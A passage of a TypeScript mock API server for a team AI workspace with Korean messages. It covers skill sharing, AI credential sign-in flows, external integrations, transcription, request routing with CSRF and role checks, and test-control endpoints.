          if (r.share.candidates.some((x) => x.applied)) fail('conflict', 409, '이미 일부를 넣은 공유 제안은 보낼 곳을 바꿀 수 없어요.')
          r.group = to
          return forCaller(r, read(r), c.user)
        },
        applySkillShare: (c) => {
          const r = mine(c)
          if (r.share.status !== 'ready') fail('conflict', 409, r.share.status === 'checking' ? '아직 확인하는 중이에요.' : '이 제안은 이미 끝났어요.')
          if (r.group ? !writes(c.user, r.group) : r.owner !== c.user.id) fail('forbidden', 403)
          // a share to a group writes into that group's skills folder, its skills only (no team rule, no tools)
          const root = r.group ? this.groupSkillRoots(c.user).find((g) => g.id === r.group)!.root : 'skills'
          const b0 = c.body as import('@mycel/shared/api').ApplySkillShare
          const b = r.group ? { ...b0, rule: false, tools: [] } : b0
          const candidates = r.share.candidates.map((x) => ({ ...x }))
          const added: { path: string; title: string; recommended: boolean }[] = []
          for (const s of b.skills) {
            const x = candidates.find((y) => y.name === s.name && y.group !== 'excluded') ?? fail('validation', 400, `${s.name}: 공유할 수 없는 스킬이에요.`)
            const title = x.title ?? x.name
            if (s.action === 'merge' && (x.sameName || x.similar)) {
              const target = (x.sameName ?? x.similar)!.path
              // while the owner's welcome steps are unfinished a merge waits for their end (docs/DECISIONS.md "W5")
              if (this.welcome && !this.welcome.finishedAt && c.user.role === 'owner') { x.applied = { status: 'later', path: target, chatId: null, error: null }; continue }
              const chat: Chat = { id: uuidv7(), projectId: null, title: `${title} 합치기`, engine: 'claude-code', model: null, createdAt: now(), updatedAt: now(), deletedAt: null, runState: 'idle' }
              this.chats.push(chat)
              x.applied = { status: 'merge', path: target, chatId: chat.id, error: null }
            } else {
              const name = s.action === 'separate' ? s.as ?? `${x.name}-2` : x.name
              const path = `${root}/${name}/SKILL.md`
              put(path, skillText(name, title))
              x.applied = { status: 'added', path, chatId: null, error: null }
              added.push({ path, title, recommended: x.group === 'recommended' })
            }
          }
          const rule = r.share.rule && b.rule ? { ...r.share.rule, path: 'skills/일하는-방식.md' } : r.share.rule
          if (rule?.path && b.rule) put(rule.path, rule.text)
          const tools = r.share.tools.map((x) => (b.tools?.includes(x.name) ? { ...x, templateId: uuidv7() } : x))
          const landing = r.group ? null : (added.find((x) => x.recommended) ?? added[0])?.path ?? null
          r.share = { ...r.share, status: 'applied', candidates, rule, tools, landing, updatedAt: now() }
          // applying a share anywhere marks 내 스킬 done for the owner (server: onboarding/welcome.ts recordShared)
          if (r.group) return forCaller(r, r.share, c.user)
          if (this.welcome && c.user.role === 'owner') {
            const w = { ...this.welcome, steps: { ...this.welcome.steps, skills: 'done' as const } }
            delete w.skillsLater
            if (added.length) w.shared = { at: this.welcome.shared?.at ?? now(), skills: [...(this.welcome.shared?.skills ?? []), ...added.map(({ path, title }) => ({ path, title }))], landing: this.welcome.shared?.landing ?? landing }
            this.welcome = this.welcomeSaved(w, now())
          }
          return forCaller(r, r.share, c.user)
        },
        dismissSkillShare: (c) => {
          const r = mine(c)
          // the names and descriptions go with it (server: skills/share.ts close)
          if (r.share.status === 'checking' || r.share.status === 'ready') r.share = { ...r.share, status: 'dismissed', candidates: [], rule: null, tools: [], updatedAt: now() }
          return undefined
        },
      }
    })(),
    // ---------------- 내 스킬 가져오기 end ----------------
    connectInfo: () => ({ teamId: 'team-acme', lanCertSha256: null, lanPort: 8443, lanHosts: [], canonicalOrigin: null }),
  }

  // ---------------- AI connections ----------------
  credentialView(c: Credential): Credential {
    return !c.owner && !c.disabled && (c.kind === 'anthropic-oauth' || c.kind === 'chatgpt') && !this.credSharedSubscriptions
      ? { ...c, state: 'sharing_off', detail: 'Shared subscriptions are off.' } : c
  }
  async addCredential(user: User, body: { kind: CredentialKind; label: string; sealed: never; acknowledgedPlanNotice?: boolean; assignments?: { subjectType: 'group' | 'user'; subjectId: string }[] }, personal: boolean): Promise<Credential> {
    if (!personal && (body.kind === 'anthropic-oauth' || body.kind === 'chatgpt') && !this.credSharedSubscriptions) fail('forbidden', 403)
    const secret = await this.sealer.unseal(body.sealed, 'credential.create').catch(() => fail('validation', 400, '보낸 값을 열 수 없어요.'))
    const re = body.kind === 'anthropic-oauth' ? /^sk-ant-oat\d{2}-/ : body.kind === 'anthropic-api-key' ? /^sk-ant-api\d{2}-/ : /^sk-(?!ant-)/
    if (!re.test(secret)) fail('validation', 400, '이 종류의 토큰·키가 아니에요.', { 'body.sealed': 'not a token of this kind' })
    if (body.kind === 'anthropic-oauth' && body.acknowledgedPlanNotice !== true) fail('validation', 400, '구독 요금제 안내를 확인해 주세요.')
    const c = this.newCredential(user, body.kind, body.label, personal, secret.includes('unverified') ? 'unverified' : 'ok')
    c.assignments = (body.assignments ?? []).map((a) => ({ ...a, name: a.subjectType === 'group' ? this.groups.find((g) => g.id === a.subjectId)?.name ?? a.subjectId : this.users.find((u) => u.id === a.subjectId)?.name ?? a.subjectId }))
    if (body.kind.endsWith('api-key')) c.hint = secret.slice(-4)
    this.credentials.push(c)
    return c
  }
  newCredential(user: User, kind: CredentialKind, label: string, personal: boolean, state: Credential['state']): Credential {
    return {
      id: uuidv7(), kind, label, scope: personal ? 'personal' : 'team', owner: personal ? { id: user.id, name: user.name } : null, assignments: [],
      priority: (this.credentials.length + 1) * 10, disabled: false, state, detail: state === 'unverified' ? '첫 질문 때 확인돼요.' : null, hint: null, planType: kind === 'chatgpt' ? 'pro' : null,
      expiresAt: kind === 'anthropic-oauth' ? new Date(Date.now() + 365 * 86400_000).toISOString() : null, limitedUntil: null, checkedAt: state === 'ok' ? now() : null, lastUsedAt: null,
      spendLimit: { usd: null, tokens: null, action: 'block' }, month: { usd: 0, tokens: 0, requests: 0 }, createdAt: now(),
    }
  }
  /** a ChatGPT sign-in: the code after a moment, then the connection. A Claude sign-in: the authorize address after a
   * moment, then it waits for the pasted code (good-code#good-state connects, anything else is a wrong code). */
  startLogin(user: User, label: string, personal: boolean, reconnectId?: string, kind: CredentialLogin['kind'] = 'chatgpt'): CredentialLogin {
    // one sign-in at a time (like the server): the owner or an admin is told whose it is and can stop it
    const running = [...this.credLogins.values()].find((x) => x.state === 'starting' || x.state === 'code' || x.state === 'checking')
    if (running) fail('busy', 409, '다른 AI 로그인이 진행 중이에요. 하나씩만 할 수 있어요.', undefined, user.role !== 'member' && !personal ? { reason: 'login_busy', loginId: running.loginId, personal: running.personal, starter: this.users.find((u) => u.id === running.userId)?.name ?? '' } : undefined)
    const loginId = 'login' + uuidv7().replace(/-/g, '')
    const l = { loginId, kind, state: 'starting' as CredentialLogin['state'], url: null as string | null, code: null as string | null, expiresAt: new Date(Date.now() + 16 * 60_000).toISOString(), credential: null as Credential | null, reason: null as string | null, userId: user.id, personal, label, reconnectId }
    this.credLogins.set(loginId, l)
    const pub = () => this.publish({ type: 'credential.login', data: this.loginView(l) })
    if (kind === 'anthropic-oauth') {
      setTimeout(() => { if (l.state !== 'starting') return; l.state = 'code'; l.url = MOCK_CLAUDE_AUTHORIZE; pub() }, 150)
      return this.loginView(l)
    }
    setTimeout(() => { if (l.state !== 'starting') return; l.state = 'code'; l.url = 'https://auth.openai.com/codex/device'; l.code = 'WXYZ-12AB3'; pub() }, 150)
    setTimeout(() => {
      if (l.state !== 'code') return
      if (!(personal ? this.credMemberOwn : this.credSharedSubscriptions)) { l.state = 'failed'; l.reason = 'policy_changed'; pub(); return }
      if (reconnectId) { const x = this.credentials.find((y) => y.id === reconnectId); if (x) { x.state = 'ok'; x.detail = null; l.credential = x } }
      else { const c = this.newCredential(user, 'chatgpt', label, personal, 'ok'); this.credentials.push(c); l.credential = c }
      l.state = 'done'; pub()
    }, 1200)
    return this.loginView(l)
  }
  loginView(l: CredentialLogin & { userId: string; personal: boolean; label: string; reconnectId?: string }): CredentialLogin {
    const { userId: _u, personal: _p, label: _l, reconnectId: _r, ...data } = l
    return data
  }
  /** the Claude code the person pasted (sealed like a token, opened with the server's real sealing code) */
  async loginCode(id: string, user: User, sealed: SealedSecret): Promise<CredentialLogin> {
    const l = this.credLogins.get(id)
    if (!l || l.userId !== user.id) return fail('not_found', 404)
    const code = (await this.sealer.unseal(sealed, 'credential.login-code').catch(() => fail('validation', 400, '보낸 값을 열 수 없어요.'))).trim()
    if (l.kind !== 'anthropic-oauth' || l.state !== 'code') return fail('conflict', 409, '이 로그인은 지금 코드를 받지 않아요. 다시 시작해 주세요.')
    if (!/^[A-Za-z0-9._~-]{1,512}#[A-Za-z0-9._~-]{1,512}$/.test(code)) return fail('validation', 400, 'Claude가 승인 뒤에 보여 준 코드 전체를 붙여 넣어 주세요(중간에 #가 있어요).')
    l.state = 'checking'
    const pub = () => this.publish({ type: 'credential.login', data: this.loginView(l) })
    pub()
    setTimeout(() => {
      if (l.state !== 'checking') return
      if (code === 'odd-code#good-state') { l.state = 'failed'; l.reason = 'token_unreadable'; pub(); return }
      if (code !== 'good-code#good-state') { l.state = 'failed'; l.reason = 'bad_code'; pub(); return }
      if (l.reconnectId) { const x = this.credentials.find((y) => y.id === l.reconnectId); if (x) { x.state = 'ok'; x.detail = null; l.credential = x } }
      else { const c = this.newCredential(user, 'anthropic-oauth', l.label, l.personal, 'ok'); this.credentials.push(c); l.credential = c }
      l.state = 'done'; pub()
    }, 1500)
    return this.loginView(l)
  }
  loginOf(id: string, user: User): CredentialLogin {
    const l = this.credLogins.get(id)
    if (!l || l.userId !== user.id) return fail('not_found', 404)
    return this.loginView(l)
  }
  cancelLogin(id: string, user: User, anyLogin = false) {
    const l = this.credLogins.get(id)
    if (!l || (l.userId !== user.id && !anyLogin)) fail('not_found', 404)
    // like the server while it saves the new token: 409 (here for the whole check)
    if (l!.state === 'checking') fail('conflict', 409, '새 토큰을 확인하고 저장하는 중이에요. 곧 끝나요.')
    if (l!.state === 'starting' || l!.state === 'code') { l!.state = 'cancelled'; this.publish({ type: 'credential.login', data: this.loginView(l!) }) }
  }

  // ---------------- external services ----------------
  integrationView(x: MockIntegration, u: User): Integration {
    const canManage = x.scope === 'personal' ? x.ownerId === u.id : u.role !== 'member'
    const { ownerId: _o, checks: _c, disabledTools: _d, ...rest } = x
    return { ...rest, hasSecret: this.integrationSecrets.has(x.id), access: x.scope === 'team' && canManage ? x.access : null, canManage }
  }
  /** may use it in their chats: the owner of a personal one; the access rule of a team one (admins are not implied) */
  requestState(r: IntegrationRequest): IntegrationRequest['state'] {
    return r.state === 'waiting' && Date.parse(r.expiresAt) <= Date.now() ? 'expired' : r.state
  }
  requestView(r: IntegrationRequest & { integrationId: string | null }): IntegrationRequest {
    const { integrationId: _, ...out } = r
    return { ...out, state: this.requestState(r), link: `http://127.0.0.1:${process.env.MOCK_PORT ?? 19143}/settings/integrations?request=${r.id}` }
  }
  /** the member it asks; anyone else (admins included) finds nothing */
  myRequest(u: User, id: string) {
    return this.integrationRequests.find((r) => r.id === id && r.user.id === u.id) ?? fail('not_found', 404)
  }
  waitingRequest<T extends IntegrationRequest>(r: T): T {
    const state = this.requestState(r)
    if (state !== 'waiting') throw new Fail('conflict', 409, '이 요청은 더 이상 기다리고 있지 않아요.', undefined, { state })
    return r
  }
  driveAdminStatus() {
    const configured = this.driveClient !== 'none'
    return { configured, source: configured ? 'app' as const : 'none' as const, canSetUp: true, blocked: null,
      redirectUri: 'https://team.example.test/api/integrations/google-drive/callback', connectedMembers: 0,
      membersCanConnect: this.driveMembers, sharesOn: configured ? this.driveShares.filter((x) => x.status === 'connected').length : 0 }
  }
  /** the speech provider the server reads: the admin's choice, else OpenRouter while the team's key is set, else off */
  speechNow(): 'off' | 'openrouter' | 'local' {
    return this.speechChosen ? this.settings.speechProvider : this.speechKey.set ? 'openrouter' : 'off'
  }
  driveTopFolders(): MockDriveFolder[] {
    return [{ id: 'drive-team', name: 'Team Drive', kind: 'drive' }, { id: 'folder-finance', name: 'Finance', kind: 'folder' }, { id: 'folder-hr', name: 'HR', kind: 'folder' }, { id: 'folder-marketing', name: 'Marketing', kind: 'folder' }]
  }
  driveShareCovers(x: MockDriveShare, u: User): boolean {
    return x.access.everyone || x.access.users.includes(u.id) || x.access.groups.some((g) => u.groupIds.includes(g))
  }
  driveShareUsers(x: MockDriveShare): number {
    return this.users.filter((u) => u.status === 'active' && this.driveShareCovers(x, u)).length
  }
  templateCovers(t: { access: IntegrationAccess }, u: User): boolean {
    return t.access.everyone || t.access.users.includes(u.id) || t.access.groups.some((g) => u.groupIds.includes(g))
  }
  templateView(t: Omit<IntegrationTemplate, 'connected'> & { version: number }): IntegrationTemplate {
    const { version: _v, ...rest } = t
    return { ...rest, connected: this.integrations.filter((x) => x.templateId === t.id && this.integrationSecrets.has(x.id)).length }
  }
  integrationAllows(x: MockIntegration, u: User): boolean {
    if (x.scope === 'personal' && x.templateId) {
      const t = this.integrationTemplates.find((y) => y.id === x.templateId)
      return x.ownerId === u.id && !!t && this.templateCovers(t, u)
    }
    if (x.scope === 'personal') return x.ownerId === u.id
    const a = x.access ?? NO_ACCESS
    return a.everyone || a.users.includes(u.id) || a.groups.some((g) => u.groupIds.includes(g))
  }
  /** the owner of a personal connection, an admin for a team one; someone else's personal connection does not exist */
  manageableIntegration(u: User, id: string): MockIntegration {
    const x = this.integrations.find((y) => y.id === id)
    if (!x || (x.scope === 'personal' && x.ownerId !== u.id) || (x.scope === 'team' && u.role === 'member' && !this.integrationAllows(x, u))) return fail('not_found', 404)
    if (x.scope === 'team' && u.role === 'member') fail('forbidden', 403)
    return x
  }
  addIntegration(u: User, body: IntegrationInput, scope: 'personal' | 'team', templateId: string | null = null): Integration {
    if (privateHost(new URL(body.url).hostname)) fail('validation', 400, '사내망이나 이 컴퓨터의 주소는 쓸 수 없어요.', { 'body.url': 'private or local address' })
    // like the server: "run without asking" is for team connections only
    if (scope === 'personal' && body.writePolicy === 'allow') fail('validation', 400, '"묻지 않고 실행"은 팀 연결에서만 고를 수 있어요.', { 'body.writePolicy': 'team connections only' })
    const siblings = this.integrations.filter((y) => (scope === 'team' ? y.scope === 'team' : y.ownerId === u.id))
    if (!templateId && siblings.filter((y) => !y.templateId).length >= (scope === 'team' ? 50 : 20)) fail('conflict', 409, '연결을 더 만들 수 없어요.')
    const base = body.slug ?? (body.name.toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 12) || 'conn')
    let slug = base
    for (let n = 2; siblings.some((y) => y.slug === slug); n++) slug = base.slice(0, 12 - String(n).length) + n
    const x: MockIntegration = {
      id: uuidv7(), scope, kind: body.kind, name: body.name, slug, url: body.url, auth: body.auth, authHeader: body.auth === 'header' ? body.authHeader ?? null : null,
      account: null, notes: body.kind === 'http' ? body.notes ?? null : null, writePolicy: body.writePolicy, status: 'needs_auth', lastError: null, tools: [], toolsUpdatedAt: null,
      access: scope === 'team' ? body.access ?? NO_ACCESS : null, createdBy: { id: u.id, name: u.name }, createdAt: now(), updatedAt: now(), lastUsedAt: null,
      ownerId: scope === 'personal' ? u.id : null, checks: 0, disabledTools: [], templateId,
    }
    if (body.secret && (body.auth === 'bearer' || body.auth === 'header')) this.integrationSecrets.set(x.id, body.secret)
    this.integrations.push(x)
    this.checkIntegration(x)
    return this.integrationView(x, u)
  }
  patchIntegration(u: User, id: string, b: IntegrationPatch): Integration {
    const x = this.manageableIntegration(u, id)
    // made from an admin's template: only the member's key and the write rule are theirs (templates.ts)
    if (x.templateId) for (const k of ['name', 'url', 'auth', 'authHeader', 'notes', 'access'] as const) if (b[k] !== undefined) fail('validation', 400, '팀이 정한 항목이라 바꿀 수 없어요.', { [`body.${k}`]: 'set by the template' })
    if (b.writePolicy === 'allow' && x.scope !== 'team') fail('validation', 400, '"묻지 않고 실행"은 팀 연결에서만 고를 수 있어요.', { 'body.writePolicy': 'team connections only' })
    if (b.access && x.scope !== 'team') fail('validation', 400, '사용할 사람은 팀 연결에만 정해요.', { 'body.access': 'team connections only' })
    const auth = b.auth ?? x.auth
    if (auth === 'oauth' && x.kind !== 'mcp') fail('validation', 400, undefined, { 'body.auth': 'sign-in (oauth) is for MCP servers' })
    const header = auth === 'header' ? (b.authHeader !== undefined ? b.authHeader : x.authHeader) : null
    if (auth === 'header' && !header) fail('validation', 400, undefined, { 'body.authHeader': 'give the header name' })
    const moved = (b.url !== undefined && b.url !== x.url) || auth !== x.auth
    if (b.url !== undefined && privateHost(new URL(b.url).hostname)) fail('validation', 400, '사내망이나 이 컴퓨터의 주소는 쓸 수 없어요.', { 'body.url': 'private or local address' })
    if (b.name !== undefined) x.name = b.name
    if (b.url !== undefined) x.url = b.url
    x.auth = auth
    x.authHeader = header
    if (b.notes !== undefined && x.kind === 'http') x.notes = b.notes
    if (b.writePolicy) x.writePolicy = b.writePolicy
    if (b.access) x.access = b.access
    // like the server: a stored key never follows a connection to another address or sign-in method
    if (moved || b.clearSecret) {
      this.integrationSecrets.delete(x.id)
      x.account = null
    }
    if (b.secret && (auth === 'bearer' || auth === 'header')) this.integrationSecrets.set(x.id, b.secret)
    if (moved) {
      x.tools = []
      x.toolsUpdatedAt = null
    }
    x.updatedAt = now()
    this.checkIntegration(x)
    return this.integrationView(x, u)
  }
  /** the connection check: a "down." host fails, a missing or refused key fails, sign-in is needed until done */
  checkIntegration(x: MockIntegration) {
    const keyed = x.auth === 'bearer' || x.auth === 'header'
    const secret = this.integrationSecrets.get(x.id)
    x.checks++
    const set = (status: Integration['status'], lastError: string | null) => Object.assign(x, { status, lastError })
    if (new URL(x.url).hostname.startsWith('down.')) set('error', '서비스가 응답하지 않아요(502). 잠시 뒤 다시 확인해 주세요.')
    else if (x.auth === 'oauth' && !secret) set('needs_auth', null)
    else if (keyed && !secret) set('error', '키가 없어요. 수정에서 키를 넣어 주세요.')
    else if (keyed && secret === 'wrong-key') set('error', '서비스가 키를 거절했어요(401). 키를 확인해 주세요.')
    else {
      set('connected', null)
      const host = new URL(x.url).hostname
      const many = (n: number) => Array.from({ length: n }, (_, i) => ({ name: `tool_${i}`, title: null, description: `Tool ${i}`, readOnly: i % 2 === 0, enabled: !x.disabledTools.includes(`tool_${i}`) }))
      if (x.kind === 'mcp' && host.startsWith('many.')) {
        // a "many." host offers 186 tools (like Higgsfield): the server keeps them all
        x.tools = many(186)
        delete x.toolsTotal
        x.toolsUpdatedAt = now()
      } else if (x.kind === 'mcp' && host.startsWith('stale.')) {
        // a "stale." host: its first list is the one an older server cut at 100 of 150; checking again saves all 150
        x.tools = many(x.checks > 1 ? 150 : 100)
        if (x.checks > 1) delete x.toolsTotal
        else x.toolsTotal = 150
        x.toolsUpdatedAt = now()
      } else if (x.kind === 'mcp') {
        // like server/src/integrations/connections/store.ts disabledTools: a tool turned off stays off, a new one is on
        x.tools = FAKE_MCP_TOOLS.slice(0, x.checks > 1 ? 3 : 2).map((t) => ({ ...t, enabled: !x.disabledTools.includes(t.name) }))
        x.toolsUpdatedAt = now()
      }
    }
  }

  enginesResponse() {
    return {
      engines: [
        { id: 'claude-code' as const, label: 'Claude Code', enabled: true, authMode: 'local-login' as const, installed: true, version: '2.1.305', status: 'ok' as const, detail: null, models: [{ id: 'claude-sonnet', label: 'Sonnet' }, { id: 'claude-opus', label: 'Opus' }], checkedAt: now() },
        { id: 'codex' as const, label: 'Codex', enabled: this.codexEnabled, authMode: 'local-login' as const, installed: true, version: '0.163.0', status: 'not_logged_in' as const, detail: 'Run `codex login --device-auth` on the server Mac.', models: [], checkedAt: now() },
        { id: 'api' as const, label: 'API', enabled: this.apiEngineEnabled, authMode: 'api-key' as const, installed: false, version: null, status: 'not_installed' as const, detail: 'Not set up yet. Enter the API address, model and key below.', models: [], checkedAt: now() },
      ],
      defaultEngine: this.settings.defaultEngine,
      defaultModel: this.settings.defaultModel,
      concurrency: this.settings.concurrency, concurrencyMax: this.cloud ? 3 : 16,
      accounts: [],
      memberChoice: this.memberChoice,
      limitFallback: this.limitFallback,
      limitFallbackAvailable: this.codexEnabled,
    }
  }

  makeAttachment(chatId: string, name: string, data: Uint8Array, mime: string, user: User): Attachment {
    const a: Attachment & { data: Uint8Array } = { id: uuidv7(), name, path: `users/${user.id}/.attachments/${chatId}/${name}`, size: data.byteLength, mime: mime || 'application/octet-stream', kind: mime.startsWith('image/') ? 'image' : mime.startsWith('audio/') ? 'audio' : 'other', data }
    this.attachments.set(a.id, a)
    this.putFile(a.path, data)
    const { data: _d, ...out } = a
    return out
  }

  /** like the server (component C checkTranscribe): a confidential chat's recording never goes to OpenRouter */
  transcribeGate(chatId: string | undefined) {
    this.transcribeChats.push(chatId ?? null)
    const confidential = chatId ? !!this.chats.find((x) => x.id === chatId)?.confidential : this.allConfidential
    if (confidential && this.speechNow() === 'openrouter' && this.speechKey.set) {
      throw new Fail('forbidden', 403, '기밀 대화라서 녹음을 바깥 음성 서비스(OpenRouter)로 보내지 않았어요. 글로 입력해 주세요.', undefined, { reason: 'confidential' })
    }
  }

  transcribeJob(user: User): string {
    const id = uuidv7()
    const job: Job = { id, kind: 'transcribe', status: 'running', progress: null, message: null, result: null, error: null, createdAt: now(), finishedAt: null }
    this.jobs.set(id, job)
    const slow = this.transcribeProgress
    if (slow) setTimeout(() => this.publish({ type: 'job.progress', data: { jobId: id, kind: 'transcribe', progress: slow.progress, message: slow.message } }), 50)
    setTimeout(() => {
      Object.assign(job, { status: 'done', progress: 1, result: { text: '받아쓴 문장입니다', language: 'ko', durationSec: 2 }, finishedAt: now() })
      this.publish({ type: 'job.done', data: { job } })
    }, slow?.ms ?? 150)
    void user
    return id
  }

  // ---------------- HTTP ----------------
  routes = listEndpoints().map(({ name, ep }) => ({ name, ep, re: new RegExp('^' + ep.path.replace(/:([A-Za-z_]+)/g, '(?<$1>[^/]+)') + '$') }))

  async handle(req: Request, dist: string): Promise<Response> {
    const url = new URL(req.url)
    const p = url.pathname
    if (p.startsWith('/__test/')) return this.testControl(p, req)
    if (!p.startsWith('/api/')) {
      const res = serveWeb(req, { dist, dev: false, devPort: 0, teamIcon: () => this.teamIcon }) ?? new Response('no', { status: 404 })
      return pageHeaders(p === '/sw.js' && res.ok ? await withoutWorkerBadge(res) : res)
    }
    this.log.push(`${req.method} ${p}`)
    // like the server's router: a path written out ("/api/intro-decks/builds") wins over one with a parameter there
    // ("/api/intro-decks/:id")
    const route = this.routes.filter((r) => r.ep.method === req.method && r.re.test(p)).sort((a, b) => a.ep.path.split(':').length - b.ep.path.split(':').length)[0]
    try {
      if (!route) return fail('not_found', 404)
      const h = this.handlers[route.name]
      if (!h) return fail('not_found', 404, `mock: ${route.name} not implemented`)
      if (req.method !== 'GET' && !req.headers.get(CSRF_HEADER)) fail('csrf', 403)
      const ep = route.ep as Endpoint
      const user = this.userOf(req)
      if (ep.auth !== 'public') {
        if (!user) fail('unauthorized', 401)
        if (((ep.auth === 'admin' || ep.auth === 'admin-reauth') && user!.role === 'member') || ((ep.auth === 'owner' || ep.auth === 'owner-reauth') && user!.role !== 'owner')) fail('forbidden', 403)
        // like the server: a temporary password reaches only the endpoints that change it
        if (user!.mustChangePassword && !ep.allowWhilePasswordChange) fail('password_change_required', 403)
      }
      const params = Object.fromEntries(Object.entries(route.re.exec(p)!.groups ?? {}).map(([k, v]) => [k, decodeURIComponent(v)]))
      const query = Object.fromEntries(url.searchParams.entries())
      if (ep.query && isSchema(ep.query)) {
        const q = ep.query.safeParse(query)
        if (!q.success) fail('validation', 400, JSON.stringify(q.error.issues))
      }
      let body: any
      let file: File | undefined
      if (ep.body && isSchema(ep.body)) {
        const parsed = (ep.body as z.ZodType).safeParse(await req.json())
        if (!parsed.success) fail('validation', 400, JSON.stringify(parsed.error.issues))
        body = parsed.data
      } else if (ep.body && (ep.body as { kind: string }).kind === 'multipart') {
        const fd = await req.formData()
        const fields: Json = {}
        for (const [k, v] of fd.entries()) if (typeof v === 'string') fields[k] = v
        const parsed = (ep.body as { fields: z.ZodType }).fields.safeParse(fields)
        if (!parsed.success) fail('validation', 400, JSON.stringify(parsed.error.issues))
        body = parsed.data
        file = fd.get('file') as File
      }
      const out = await h({ user: user!, params, query, body, req, file })
      if (out instanceof Response) return out
      const o = (out && typeof out === 'object' && ('body' in (out as Json) || 'cookie' in (out as Json)) && !('id' in (out as Json)) ? out : { body: out }) as { status?: number; body: unknown; cookie?: string }
      const status = o.status ?? ep.status ?? 200
      const headers: Record<string, string> = { 'content-type': 'application/json' }
      if (o.cookie) headers['set-cookie'] = o.cookie
      if (status === 204 || (!isSchema(ep.response) && (ep.response as { kind: string }).kind === 'empty')) return new Response(null, { status: 204, headers: o.cookie ? { 'set-cookie': o.cookie } : {} })
      // the mock must speak the contract exactly: a mismatch here is a bug in the mock or the contract changed
      const checked = (ep.response as z.ZodType).parse(o.body)
      return new Response(JSON.stringify(checked), { status, headers })
    } catch (e) {
      if (e instanceof Fail) return new Response(JSON.stringify(ApiErrorResponse.parse({ error: { code: e.code, message: e.message, ...(e.fields ? { fields: e.fields } : {}), ...(e.params ? { params: e.params } : {}) } })), { status: e.status, headers: { 'content-type': 'application/json' } })
      console.error('mock error', req.method, p, e)
      return new Response(JSON.stringify({ error: { code: 'internal', message: String(e) } }), { status: 500, headers: { 'content-type': 'application/json' } })
    }
  }

  async testControl(p: string, req: Request): Promise<Response> {
    const body = (await req.json().catch(() => ({}))) as Json
    if (p === '/__test/reset') this.reset({ setup: !!body.setup, teamLocale: Locale.safeParse(body.teamLocale).data, usersFollowTeam: !!body.usersFollowTeam, mustChange: typeof body.mustChange === 'string' ? body.mustChange : undefined, withAdmin: !!body.withAdmin })
    else if (p === '/__test/drop-ws') for (const ws of this.sockets) ws.close(WsClose.serviceRestart, 'restart')
    else if (p === '/__test/server-version') this.serverVersion = String(body.version)
    else if (p === '/__test/upload-delay') this.uploadDelayMs = Number(body.ms)
    else if (p === '/__test/deck-pace') {
      this.deckPaceMs = Number(body.ms ?? 40)
      this.deckThumbs = body.thumbs !== false
      this.deckTier = body.tier === 'standard' || body.tier === 'deep' ? body.tier : 'quick'
    }
    else if (p === '/__test/knowledge-graph') this.kg = mockKnowledgeGraph(body.available !== false)
    else if (p === '/__test/cloud') this.cloud = body.on !== false
    else if (p === '/__test/popular-skills') this.popular = (body.items as { path: string; uses: number; users: number }[]) ?? []
    else if (p === '/__test/team-goal') this.teamGoal = body.goal === null ? null : TeamGoal.parse(body.goal)
    else if (p === '/__test/result-suggestion') this.resultSuggestion = body.suggestion ? (body.suggestion as unknown as import('@mycel/shared/api').ResultSuggestion) : null
    else if (p === '/__test/html-pdf' && req.method === 'GET') return Response.json(this.htmlPdfCalls)
    else if (p === '/__test/html-pdf') this.htmlPdf = body.on !== false
    else if (p === '/__test/dev-env') {
      if (body.network === 'offline') this.devEnvTeam.network = 'offline'
      if (Array.isArray(body.sites)) this.devEnvSites.set(this.users[0]!.id, { sites: (body.sites as string[]).map((host) => ({ host, createdAt: now() })), full: false })
      this.devEnv = body.srt ? { srt: { running: [], waiting: [] } } : {}
    }
    else if (p === '/__test/skill-list') this.aiList = SkillsOverview.shape.aiList.parse(body)
    else if (p === '/__test/connection') this.connection = { ...this.connection, ...(body as unknown as Partial<ConnectionStatus>) }
    else if (p === '/__test/speech-host') this.speechHost = { ...this.speechHost, ...(body as unknown as Partial<typeof this.speechHost>) }
    else if (p === '/__test/memory') this.memories.push({ id: uuidv7(), text: String(body.text), sourceChatId: null, createdAt: now() })
    else if (p === '/__test/schedule') {
      // a scheduled task the owner confirmed on its card (or a template: templateId), for Settings › Scheduled tasks
      const owner = this.users.find((u) => u.role === 'owner')!
      const tpl = typeof body.templateId === 'string' ? body.templateId as 'daily-file-index' | 'weekly-summary' : null
      this.schedules.push({ userId: owner.id, id: uuidv7(), title: String(body.title ?? '주간 회의록 요약'), prompt: String(body.prompt ?? '매주 월요일 shared/회의록 에서 지난주 회의록을 읽고 users/olga/주간요약.md 에 정리해 줘.'),
        repeat: tpl === 'weekly-summary' ? 'weekly' : tpl ? 'daily' : (body.repeat as Schedule['repeat'] | undefined) ?? 'weekly', time: '09:00', weekday: tpl === 'daily-file-index' ? null : 1, day: null, date: null, projectId: null,
        enabled: body.enabled !== false, resumeBlockedReason: null, nextRunAt: body.enabled === false ? null : new Date(Date.now() + 86400_000).toISOString(), lastRunAt: null, lastChatId: null, needsReview: false, reviewSince: null,
        ...(tpl ? { templateId: tpl, templateVersion: 1, sourcePath: 'shared/회의록', outputPath: `users/${owner.id}/reports` } : {}) })
    }
    else if (p === '/__test/schedule-review') {
      // a free-text task made before the schedule card: paused until its owner confirms it again
      const owner = this.users.find((u) => u.role === 'owner')!
      this.schedules.push({ userId: owner.id, id: uuidv7(), title: '아침 요약', prompt: '매일 아침 https://feeds.example.com/r/c2fsyxj5ltk4nzy1ndmy 를 읽고 users/olga/요약.md 에 정리해 줘.',
        repeat: 'daily', time: '09:00', weekday: null, day: null, date: null, projectId: null, enabled: false, resumeBlockedReason: null, nextRunAt: null, lastRunAt: null,
        lastChatId: null, needsReview: true, reviewSince: now() })
    }
    else if (p === '/__test/log') return Response.json(this.log)
    else if (p === '/__test/engine-requests') return Response.json(this.engineRequests)
    else if (p === '/__test/member-choice') this.memberChoice = MemberEngineChoice.parse(body)
    else if (p === '/__test/queue') {
      const chatId = String(body.chatId), position = Number(body.position)
      const assistant = this.messages.find(m => m.chatId === chatId && m.status === 'streaming')
      if (!assistant?.turnId || !Number.isInteger(position) || position < 0) return Response.json({ ok: false }, { status: 400 })
      this.queuePositions.set(chatId, position)
      this.publish({ type: 'queue.position', data: { chatId, messageId: assistant.id, turnId: assistant.turnId, position, epoch: this.epoch, revision: ++this.queueRevision } })
    }
    else if (p === '/__test/confidential') this.allConfidential = body.all === true
    else if (p === '/__test/speech') {
      this.settings.speechProvider = body.provider === 'openrouter' || body.provider === 'off' ? body.provider : 'local'
      this.speechKey = body.key ? { set: true, hint: 'mock', updatedAt: now() } : { set: false, hint: null, updatedAt: null }
